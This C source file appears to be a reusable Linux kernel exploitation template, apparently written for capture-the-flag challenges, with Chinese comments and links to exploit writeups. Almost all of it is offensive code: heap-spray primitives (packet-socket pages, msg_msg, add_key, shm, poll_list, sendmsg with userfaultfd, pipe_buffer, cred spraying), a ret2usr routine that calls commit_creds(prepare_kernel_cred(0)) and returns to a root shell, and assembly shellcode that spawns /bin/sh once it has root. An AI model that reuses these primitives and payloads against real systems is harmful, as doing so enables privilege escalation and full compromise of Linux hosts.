#include "banzi.h"

/**
 * global variables
 */
int sprayfd_child[2];
int sprayfd_parent[2];
int socketfds[10*INITIAL_PAGE_SPRAY];
unsigned long user_cs, user_ss, user_rflags, user_sp;
unsigned long long int base_addr;
void *(*prepare_kernel_cred)(uint64_t)KERNCALL;
void (*commit_creds)(void *) KERNCALL;
int spray_keys[0x1000];
int shmid[0x1000];
void *shmaddr[0x1000];
pthread_t poll_tid[0x1000];
size_t poll_threads;
pthread_mutex_t mutex;
int poll_watch_fd;
int sendmsg_socketfd;
char **sendmsg_mmaped_addrs;
struct sockaddr_in socket_addr;
struct msghdr *sendmsg_msgs;


/**
 * socket 占页
 * https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html
 * 需要在内核中开启 CONFIG_USER_NS=y, 默认开启
 */

void unshare_setup(uid_t uid, gid_t gid) {
    int temp;
    char edit[0x100];
    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);
    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);
    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);
    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    return;
}

void send_spray_cmd(enum spray_cmd cmd, int idx, uint32_t order) {
    ipc_req_t req;
    int32_t result;

    req.cmd = cmd;
    req.idx = idx;
    req.order = order;
    write(sprayfd_child[1], &req, sizeof(req));
    read(sprayfd_parent[0], &result, sizeof(result));
    assert(result == idx);
}

int alloc_pages_via_sock(uint32_t size, uint32_t n) {
    struct tpacket_req req;
    int32_t socketfd, version;

    socketfd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socketfd < 0) {
        perror("bad socket");
        exit(-1);
    }

    version = TPACKET_V1;

    if (setsockopt(socketfd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version)) < 0) {
        perror("setsockopt PACKET_VERSION failed");
        exit(-1);
    }

    assert(size % 4096 == 0);

    memset(&req, 0, sizeof(req));

    req.tp_block_size = size;
    req.tp_block_nr = n;
    req.tp_frame_size = 4096;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    // printf("req.tp_block_size: %d\n", req.tp_block_size);

    if (setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0) {
        perror("setsockopt PACKET_TX_RING failed");
        exit(-1);
    }

    return socketfd;
}

void spray_comm_handler() {
    ipc_req_t req;
    int32_t result;

    do {
        read(sprayfd_child[0], &req, sizeof(req));
        assert(req.idx < 10*INITIAL_PAGE_SPRAY);
        if (req.cmd == ALLOC_PAGE) {
            assert(req.order < 10);
            socketfds[req.idx] = alloc_pages_via_sock(4096*(1 << req.order), 1);
        } else if (req.cmd == FREE_PAGE) {
            close(socketfds[req.idx]);
        }
        result = req.idx;
        write(sprayfd_parent[1], &result, sizeof(result));
    } while (req.cmd != EXIT_SPRAY);
}

static void socket_spray_example() {
    uint32_t order = 0;
    // for communicating with spraying in separate namespace via TX_RINGs
    pipe(sprayfd_child);
    pipe(sprayfd_parent);

    puts("setting up spray manager in separate namespace");
    if (!fork()) {
        unshare_setup(getuid(), getgid());
        spray_comm_handler();
    }

    puts("Allocated all pages");
    for (int i = 0; i < INITIAL_PAGE_SPRAY; i++) {
        send_spray_cmd(ALLOC_PAGE, i, order);
    }

    puts("Closed all odd pages");
    for (int i = 1; i < INITIAL_PAGE_SPRAY; i += 2) {
        send_spray_cmd(FREE_PAGE, i, 0);
    }

    // TODO: get the freed odd pages back with our struct
    // puts("Allocated all shm");
    // for (int i = 0; i < ((INITIAL_PAGE_SPRAY) / 2) * (0x1000 / 0x20) / 100; i++) {
    //     alloc_shm(i);
    // }

    puts("Closed all even pages");
    for (int i = 0; i < INITIAL_PAGE_SPRAY; i += 2) {
        send_spray_cmd(FREE_PAGE, i, 0);
    }
}

/**
 * ROP 相关
 */

void *(*prepare_kernel_cred)(uint64_t)KERNCALL = (void *(*)(uint64_t))0xffffffff810b9d80; // TODO:change it
void (*commit_creds)(void *) KERNCALL = (void (*)(void *))0xffffffff810b99d0;             // TODO:change it

void save_stats_64() {
    __asm__ __volatile__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
        :
        : "memory");
}

void templine() {
    commit_creds(prepare_kernel_cred(0));
    __asm__ __volatile__(
        "pushq   %0;"
        "pushq   %1;"
        "pushq   %2;"
        "pushq   %3;"
        "pushq   $shell;"
        "pushq   $0;"
        "swapgs;"
        "popq    %%rbp;"
        "iretq;"
        :
        : "m"(user_ss), "m"(user_sp), "m"(user_rflags), "m"(user_cs));
}

void shell() {
    printf("root\n");
    system("/bin/sh");
    exit(0);
}

uint64_t calc(uint64_t addr) { return addr - 0xffffffff81000000 + base_addr; }

/**
 * msg_msg 相关
 * https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html
 */

int32_t make_queue(key_t key, int msgflg) {
    int32_t qid;
    if ((qid = msgget(key, msgflg)) == -1) {
        perror("msgget failure");
        exit(-1);
    }
    return qid;
}

void get_msg(int msqid, struct msg_struct *msgp, size_t msgsz, long msgtyp, int msgflg) {
    if (msgrcv(msqid, msgp, msgsz, msgtyp, msgflg) < 0) {
        perror("msgrcv");
        exit(-1);
    }
    return;
}

void send_msg(int msqid, struct msg_struct *msgp, size_t msgsz, int msgflg) {
    if (msgsnd(msqid, msgp, msgsz, msgflg) == -1) {
        perror("msgsend failure");
        exit(-1);
    }
    return;
}

static void msg_msg_example() {
    char *message = "Hello, World";
    char *recieved = malloc(0x100);
    int qid = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
    send_msg(qid, message, strlen(message) + 1, 0);
    get_msg(qid, recieved, strlen(message) + 1, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
}

/**
 * cpu_affinity 相关
 */

void assign_to_core(int core_id) {
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0) {
        perror("[X] sched_setaffinity()");
        exit(1);
    }
}

void assign_thread_to_core(int core_id) {
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0) {
        perror("[X] assign_thread_to_core_range()");
        exit(1);
    }
}

/**
 * userfaultfd 相关
 */

uint64_t register_userfault(uint64_t fault_page, uint64_t fault_page_len, uint64_t handler) {
    struct uffdio_api ua;
    struct uffdio_register ur;
    pthread_t thr;

    uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // Create THE User Fault Fd
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1) errExit("[-] ioctl-UFFDIO_API");
    ur.range.start = (unsigned long)fault_page;
    ur.range.len = fault_page_len;
    ur.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
        errExit(
            "[-] ioctl-UFFDIO_REGISTER"); //注册页地址与错误处理FD,若访问到FAULT_PAGE，则访问被挂起，uffd会接收到信号
    if (pthread_create(&thr, NULL, (void *(*)(void *))handler, (void *)uffd)) // handler函数进行访存错误处理
        errExit("[-] pthread_create");
    return uffd;
}

static void *userfault_handler_example(void *arg) {
    struct uffd_msg msg; /* Data read from userfaultfd */
    int fault_cnt = 0;   /* Number of faults so far handled */
    long uffd;           /* userfaultfd file descriptor */
    char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long)arg;

    /* Create a page that will be copied into the faulting region */

    if (page == NULL) {
        page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (page == MAP_FAILED) perror("mmap");
    }

    /* Loop, handling incoming events on the userfaultfd
      file descriptor */

    for (;;) {
        /* See what poll() tells us about the userfaultfd */

        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        if (nready == -1) puts("poll");

        /* Read an event from the userfaultfd */

        nread = read(uffd, &msg, sizeof(msg));
        if (nread == 0) {
            printf("EOF on userfaultfd!\n");
            exit(EXIT_FAILURE);
        }

        if (nread == -1) puts("read");

        /* We expect only one kind of event; verify that assumption */

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
            exit(EXIT_FAILURE);
        }

        /* Copy the page pointed to by 'page' into the faulting
          region. Vary the contents that are copied in, so that it
          is more obvious that each fault is handled separately. */
        if (msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WRITE) {
            // TODO: write
            printf("[-] triggering write fault\n");
            sleep(2);
        } else {
            // TODO: read
            printf("[-] triggering read fault\n");
            sleep(2);

            fault_cnt++;

            uffdio_copy.src = (unsigned long)page;

            uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address & ~(0x1000 - 1);
            uffdio_copy.len = 0x1000;
            uffdio_copy.mode = 0;
            uffdio_copy.copy = 0;
            if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) perror("ioctl-UFFDIO_COPY");
        }
    }
}

/**
 * add_key 相关
 * https://syst3mfailure.io/corjail
 */

int alloc_key(int id, char *buff, size_t size) {
    char desc[256] = {0};
    char *payload;
    int key;

    size -= sizeof(struct user_key_payload);

    sprintf(desc, "payload_%d", id);

    payload = buff ? buff : calloc(1, size);

    if (!buff) memset(payload, id, size);

    key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);

    if (key < 0) {
        perror("[X] add_key()");
        return -1;
    }

    return key;
}

void free_key(int i) {
    keyctl_revoke(spray_keys[i]);
    keyctl_unlink(spray_keys[i], KEY_SPEC_PROCESS_KEYRING);
}

char *get_key(int i, size_t size) {
    char *data;

    data = calloc(1, size);
    keyctl_read(spray_keys[i], data, size);

    return data;
}

/**
 * shm 相关
 * https://syst3mfailure.io/sixpack-slab-out-of-bounds
 */

void alloc_shm(int i) {
    shmid[i] = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600);

    if (shmid[i] < 0) {
        perror("[X] shmget fail");
        exit(1);
    }

    shmaddr[i] = (void *)shmat(shmid[i], NULL, SHM_RDONLY);

    if (shmaddr[i] < 0) {
        perror("[X] shmat");
        exit(1);
    }
}

/**
 * hexdump
 */

void hexdump(unsigned char *buff, size_t size) {
    int i, j;

    for (i = 0; i < size / 8; i++) {
        if ((i % 2) == 0) {
            if (i != 0) printf("  \n");

            printf("  %04x  ", i * 8);
        }

        printf("0x%016lx", ((uint64_t *)(buff))[i]);
        printf("    ");
    }

    putchar('\n');
}

/**
 * pollfd 相关
 * https://syst3mfailure.io/corjail
 */

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

void *alloc_poll_list(void *args) {
    struct pollfd *pfds;
    int nfds, timeout, id, watch_fd;

    id = ((struct t_args *)args)->id;
    nfds = ((struct t_args *)args)->nfds;
    timeout = ((struct t_args *)args)->timeout;
    watch_fd = ((struct t_args *)args)->watch_fd;

    pfds = calloc(nfds, sizeof(struct pollfd));

    for (int i = 0; i < nfds; i++) {
        pfds[i].fd = watch_fd;
        pfds[i].events = POLLERR;
    }

    assign_thread_to_core(0);

    pthread_mutex_lock(&mutex);
    poll_threads++;
    pthread_mutex_unlock(&mutex);

    printf("[Thread %d] Start polling...\n", id);
    int ret = poll(pfds, nfds, timeout);
    printf("[Thread %d] Polling complete: %d!\n", id, ret);
}

void create_poll_thread(int id, size_t size, int timeout) {
    struct t_args *args;

    args = calloc(1, sizeof(struct t_args));

    if (size > PAGE_SIZE) size = size - ((size / PAGE_SIZE) * sizeof(struct poll_list));

    args->id = id;
    args->nfds = NFDS(size);
    args->timeout = timeout;
    args->watch_fd = poll_watch_fd;

    pthread_create(&poll_tid[id], 0, alloc_poll_list, (void *)args);
}

void *alloc_poll_list_for_crosscache(void *args) {
    struct pollfd *pfds;
    int nfds, timeout, id, watch_fd;

    id = ((struct t_args *)args)->id;
    nfds = ((struct t_args *)args)->nfds;
    timeout = ((struct t_args *)args)->timeout;
    watch_fd = ((struct t_args *)args)->watch_fd;

    pfds = calloc(nfds, sizeof(struct pollfd));

    for (int i = 0; i < nfds; i++) {
        pfds[i].fd = watch_fd;
        pfds[i].events = POLLERR;
    }

    assign_thread_to_core(0);

    pthread_mutex_lock(&mutex);
    poll_threads++;
    pthread_mutex_unlock(&mutex);

    sleep(6);

    printf("[Thread %d] Start polling...\n", id);
    int ret = poll(pfds, nfds, timeout);
    printf("[Thread %d] Polling complete: %d!\n", id, ret);
}

void create_poll_thread_for_crosscache(int id, size_t size, int timeout) {
    struct t_args *args;

    args = calloc(1, sizeof(struct t_args));

    if (size > PAGE_SIZE) size = size - ((size / PAGE_SIZE) * sizeof(struct poll_list));

    args->id = id;
    args->nfds = NFDS(size);
    args->timeout = timeout;
    args->watch_fd = poll_watch_fd;

    pthread_create(&poll_tid[id], 0, alloc_poll_list_for_crosscache, (void *)args);
}

void join_poll_threads(void) {
    for (int i = 0; i < poll_threads; i++) pthread_join(poll_tid[i], NULL);

    poll_threads = 0;
}

void init_fd() {
    poll_watch_fd = open("/etc/passwd", O_RDONLY);

    if (poll_watch_fd < 1) {
        perror("[X] init_fd()");
        exit(1);
    }
}

/**
 * msgsnd 相关
 * 需要 userfaultfd 配合使用，并注意检查 userfaultfd 结束后，sendmsg 是否返回。
 */

struct sockaddr_in socket_addr = {0};

void sendmsg_init(uint64_t n, uint64_t spray_size, uint64_t offset, uint64_t userfault_handler) {
    assert(offset < PAGE_SIZE && "offset must be less than PAGE_SIZE");
    assert(spray_size > 44 && "spray_size must be greater than 44");
    sendmsg_mmaped_addrs = calloc(n, sizeof(uint64_t));
    for (int i = 0; i < n; i++) {
        sendmsg_mmaped_addrs[i] = mmap(NULL, 2 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (sendmsg_mmaped_addrs[i] == MAP_FAILED) {
            perror("[X] mmap");
            exit(1);
        }
        // hit all the odd pages
        sendmsg_mmaped_addrs[i][0] = '\0';
    }

    sendmsg_socketfd = socket(AF_INET, SOCK_DGRAM, 0);
    socket_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    socket_addr.sin_family = AF_INET;
    socket_addr.sin_port = htons(6666);

    sendmsg_msgs = calloc(n, sizeof(struct msghdr));
    if (sendmsg_msgs == NULL) {
        perror("[X] calloc");
        exit(1);
    }
    for (int i = 0; i < n; i++) {
        memset(&sendmsg_msgs[i], 0, sizeof(struct msghdr));
        sendmsg_msgs[i].msg_control = sendmsg_mmaped_addrs[i] + offset;
        sendmsg_msgs[i].msg_controllen = spray_size;
        sendmsg_msgs[i].msg_name = (caddr_t)&socket_addr;
        sendmsg_msgs[i].msg_namelen = sizeof(socket_addr);
        register_userfault(sendmsg_mmaped_addrs[i] + 0x1000, PAGE_SIZE, (uint64_t)userfault_handler);
    }
}


/**
 * @brief pipe_buffer 相关
 * 
 */



int pipefds[PIPE_SPRAY_NUM][2];

void extend_pipe_buffer(int idx, size_t size) {
    int ret = fcntl(pipefds[idx][1], F_SETPIPE_SZ, size);
    if (ret < 0) {
        perror("[X] fcntl");
        exit(1);
    }
}

void spray_pipe() {
    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        if (pipe(pipefds[i]) < 0) {
            perror("[X] pipe");
            exit(1);
        }
    }
}

/**
 * @brief convert page to physic address
 * 
 */

uint64_t virtual_base = 0xffff888000000000;
uint64_t vmemmap_base = 0xffffea0000000000;

uint64_t page_to_virtual(uint64_t page) {
    uint64_t page_cnt = (page - vmemmap_base) / 0x40;
    uint64_t virtual_addr = virtual_base + page_cnt * 0x1000;
    return virtual_addr;
}

uint64_t page_to_physic(uint64_t page) {
    return page_to_virtual(page) - virtual_base;
}


/**
 * @brief fork spray cred 相关
 * 
 */

// __attribute__((naked)) pid_t __clone(uint64_t flags, void *dest)
// {
//     __asm__ __volatile__(
//         ".intel_syntax noprefix;\n"
//         "mov r15, rsi;\n"
//         "xor rsi, rsi;\n"
//         "xor rdx, rdx;\n"
//         "xor r10, r10;\n"
//         "xor r9, r9;\n"
//         "mov rax, 56;\n"
//         "syscall;\n"
//         "cmp rax, 0;\n"
//         "jl bad_end;\n"
//         "jg good_end;\n"
//         "jmp r15;\n"
//         "bad_end:\n"
//         "neg rax;\n"
//         "ret;\n"
//         "good_end:\n"
//         "ret;\n"
//         ".att_syntax prefix;\n"
//     );
// }

int rootfd[2];
struct timespec timer = {.tv_sec = 1000000000, .tv_nsec = 0};
char throwaway;
char root[] = "root\n";
char binsh[] = "/bin/sh\x00";
char *args[] = {"/bin/sh", NULL};

__attribute__((naked)) void check_and_wait()
{
    __asm__ __volatile__(
        ".intel_syntax noprefix;\n"
        "lea rax, [rootfd];\n"
        "mov edi, dword ptr [rax];\n"
        "lea rsi, [throwaway];\n"
        "mov rdx, 1;\n"
        "xor rax, rax;\n"
        "syscall;\n"
        "mov rax, 102;\n"
        "syscall;\n"
        "cmp rax, 0;\n"
        "jne finish;\n"
        "mov rdi, 1;\n"
        "lea rsi, [root];\n"
        "mov rdx, 5;\n"
        "mov rax, 1;\n"
        "syscall;\n"
        "lea rdi, [binsh];\n"
        "lea rsi, [args];\n"
        "xor rdx, rdx;\n"
        "mov rax, 59;\n"
        "syscall;\n"
        "finish:\n"
        "lea rdi, [timer];\n"
        "xor rsi, rsi;\n"
        "mov rax, 35;\n"
        "syscall;\n"
        "ret;\n"
        ".att_syntax prefix;\n"
    );
}

int just_wait()
{
    sleep(1000000000);
}

void fork_spray_cred_example() {
    pipe(rootfd);

    for (int i = 0; i < 0x20; i++) {
        pid_t result = fork();
        if (!result)
        {
            just_wait();
        }
        if (result < 0)
        {
            puts("fork limit");
            exit(-1);
        }
    }

    // TODO: 页风水布局

    for (int i = 0; i < 0x40; i++)
    {
        pid_t result = __clone(CLONE_FLAGS, &check_and_wait);
        if (result < 0)
        {
            perror("clone error");
            exit(-1);
        }
    }

}